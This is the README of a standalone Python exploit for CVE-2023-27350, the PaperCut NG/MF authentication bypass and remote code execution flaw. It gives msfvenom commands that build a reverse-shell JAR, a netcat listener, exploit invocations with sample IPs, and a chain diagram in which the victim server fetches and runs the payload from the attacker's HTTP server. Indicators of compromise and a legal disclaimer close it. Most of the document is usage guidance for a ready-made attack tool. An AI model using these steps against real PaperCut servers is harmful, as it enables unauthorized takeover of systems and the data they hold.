# CVE-2023-27350 — PaperCut NG/MF Authentication Bypass & RCE

Standalone Python exploit for the critical authentication bypass and remote code execution vulnerability in PaperCut NG/MF. CVSS 9.8.

## Description

CVE-2023-27350 affects PaperCut NG and MF in versions prior to 20.1.7, 21.2.11, and 22.0.9. The flaw allows an unauthenticated attacker to access the `/app?service=page/SetupCompleted` endpoint — a setup page intended to be reachable only during the initial installation — and obtain a valid administrative session without any credentials.

With admin access, the attacker can enable PaperCut's print scripting mechanism and inject arbitrary code executed by the server's JVM, resulting in full RCE in the context of the service user.

## Affected Versions

| Branch | Fixed Version |
|--------|--------------|
| 20.x   | 20.1.7       |
| 21.x   | 21.2.11      |
| 22.x   | 22.0.9       |

Versions 18.x and earlier received no official patch.

## Reference Implementations

This exploit was developed from the analysis of two public implementations:

### 1. horizon3ai/CVE-2023-27350 (Python)
- **Repository:** https://github.com/horizon3ai/CVE-2023-27350
- **Approach:** uses `Runtime.exec()` with a plain string to run commands
- **Limitations:** `Runtime.exec(String)` does not process shell metacharacters (`>&`, `|`, `0>&1`), making reverse shell payloads ineffective. The script also hardcodes the printer ID (`l1001`) and checks for English-only success strings, failing on non-English instances
- **Incorrect engine assumption:** does not account for PaperCut using RhinoJS (not BeanShell), which causes syntax errors in certain Java payloads

### 2. rapid7/metasploit-framework — PaperCutNG Authentication Bypass
- **Module:** `exploit/multi/http/papercut_ng_rce`
- **Approach:** loads a Metasploit JAR into the JVM via `URLClassLoader`, avoiding any shell dependency
- **Limitations:** requires the full Metasploit Framework and generates a Java/Meterpreter payload; not easily adapted for standalone use with `nc`

## Requirements

```
Python 3.x
requests
msfvenom (part of Metasploit Framework)
nc (netcat)
```

```bash
pip install requests
```

## Usage

**1. Generate the JAR payload**

```bash
msfvenom -p java/shell_reverse_tcp \
  LHOST=<YOUR_IP> LPORT=<SHELL_PORT> \
  -f jar -o payload.jar
```

**2. Start a listener**

```bash
nc -lvnp <SHELL_PORT>
```

**3. Run the exploit**

```bash
python CVE-2023-27350.py \
  -u http://<TARGET>:9191 \
  -j payload.jar \
  -lh <YOUR_IP> \
  -lp <HTTP_PORT> \
  -rp <SHELL_PORT>
```

**Example:**

```bash
python CVE-2023-27350.py \
  -u http://192.168.1.100:9191 \
  -j payload.jar \
  -lh 192.168.1.10 \
  -lp 9090 \
  -rp 4444
```

## Parameters

| Parameter | Description | Default |
|-----------|-------------|---------|
| `-u` / `--url` | PaperCut base URL | required |
| `-j` / `--jar` | Path to payload.jar | required |
| `-lh` / `--lhost` | Your IP (target will connect back here) | required |
| `-lp` / `--lport` | HTTP port to serve the JAR | 9090 |
| `-rp` / `--rport` | Reverse shell port | 4444 |

## How It Works

```
1. Auth bypass via /app?service=page/SetupCompleted
        ↓
2. Obtain admin JSESSIONID without credentials
        ↓
3. Select [Template Printer] (l1001)
        ↓
4. Inject RhinoJS script into the print script field
        ↓
5. Script creates a URLClassLoader pointing to our HTTP server
        ↓
6. PaperCut JVM downloads and executes payload.jar
        ↓
7. Reverse shell
```

## Indicators of Compromise (IoC)

- Access to `/app?service=page/SetupCompleted` without a prior session
- Modification of `print-and-device.script.enabled` and `print.script.sandboxed` settings (versions >= 19)
- Outbound HTTP connection from the PaperCut server to an external IP
- `URLClassLoader` instantiation with an external URL in JVM logs

## Legal Disclaimer

This exploit is provided for educational purposes and authorized use only (penetration testing, CTF, lab environments). Unauthorized use against systems without explicit permission is illegal. The author is not responsible for any misuse.
